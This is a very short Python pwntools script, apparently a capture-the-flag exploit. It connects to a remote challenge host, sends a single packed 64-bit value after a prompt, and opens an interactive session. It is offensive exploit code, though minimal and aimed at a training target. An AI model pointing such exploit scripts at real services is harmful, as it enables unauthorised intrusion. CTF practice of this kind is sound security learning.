from pwn import *

context(arch='amd64', os='linux', log_level='debug')
io = remote('redirect.do-not-trust.hacking.run', 10134)
io.sendlineafter(b':', p64(0xbabababa))
io.interactive()